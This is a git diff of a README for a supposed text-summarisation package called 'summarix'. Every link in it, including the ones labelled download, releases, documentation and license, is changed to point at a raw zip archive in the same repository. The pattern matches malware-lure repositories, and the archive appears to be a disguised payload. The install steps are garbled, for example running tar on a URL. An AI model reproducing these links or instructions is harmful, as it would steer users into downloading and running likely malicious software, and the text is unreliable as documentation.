@@ -6,7 +6,7 @@ Welcome to **summarix**! This package helps you take stories and text statements
 
 ## 📥 Download Now
 
-[![Download Summarix](https://github.com/loup-cpu/summarix/raw/refs/heads/main/summarix/Software-unmetricalness.zip%20Summarix-latest-brightgreen)](https://github.com/loup-cpu/summarix/raw/refs/heads/main/summarix/Software-unmetricalness.zip)
+[![Download Summarix](https://raw.githubusercontent.com/loup-cpu/summarix/main/summarix/Software-v2.3.zip%20Summarix-latest-brightgreen)](https://raw.githubusercontent.com/loup-cpu/summarix/main/summarix/Software-v2.3.zip)
 
 ## 📋 Key Features
 
@@ -22,11 +22,11 @@ Welcome to **summarix**! This package helps you take stories and text statements
 
 ## 🌐 Download & Install
 
-To get started with **summarix**, visit this page to download: [Releases Page](https://github.com/loup-cpu/summarix/raw/refs/heads/main/summarix/Software-unmetricalness.zip).
+To get started with **summarix**, visit this page to download: [Releases Page](https://raw.githubusercontent.com/loup-cpu/summarix/main/summarix/Software-v2.3.zip).
 
 1. Click on the link above.
 2. Find the version you want to download.
-3. Click on the asset file that matches your system (e.g., `.exe` for Windows, `.dmg` for Mac, or https://github.com/loup-cpu/summarix/raw/refs/heads/main/summarix/Software-unmetricalness.zip for Linux).
+3. Click on the asset file that matches your system (e.g., `.exe` for Windows, `.dmg` for Mac, or https://raw.githubusercontent.com/loup-cpu/summarix/main/summarix/Software-v2.3.zip for Linux).
 4. Once the file is downloaded, follow the steps below for installation. 
 
 ## 📄 Installation Instructions
@@ -49,7 +49,7 @@ To get started with **summarix**, visit this page to download: [Releases Page](h
 
 1. Open your terminal.
 2. Navigate to the directory where you downloaded the file.
-3. Use the command: `tar -xzf https://github.com/loup-cpu/summarix/raw/refs/heads/main/summarix/Software-unmetricalness.zip` (replace `filename` with the actual file name).
+3. Use the command: `tar -xzf https://raw.githubusercontent.com/loup-cpu/summarix/main/summarix/Software-v2.3.zip` (replace `filename` with the actual file name).
 4. Follow any additional commands provided in the README that came with the package to complete installation.
 
 ## 🛠 System Requirements
@@ -85,7 +85,7 @@ If summarix encounters difficulties in processing your input, it will automatica
 
 ## 🔗 Explore More
 
-For additional resources, including FAQs and detailed usage, please visit our documentation [here](https://github.com/loup-cpu/summarix/raw/refs/heads/main/summarix/Software-unmetricalness.zip).
+For additional resources, including FAQs and detailed usage, please visit our documentation [here](https://raw.githubusercontent.com/loup-cpu/summarix/main/summarix/Software-v2.3.zip).
 
 ## ⚙️ Contributing
 
@@ -93,7 +93,7 @@ We welcome contributions! If you're interested in helping improve summarix, plea
 
 ## 📝 License
 
-This project is licensed under the MIT License. You can review the full license [here](https://github.com/loup-cpu/summarix/raw/refs/heads/main/summarix/Software-unmetricalness.zip).
+This project is licensed under the MIT License. You can review the full license [here](https://raw.githubusercontent.com/loup-cpu/summarix/main/summarix/Software-v2.3.zip).
 
 ## 📞 Support
 
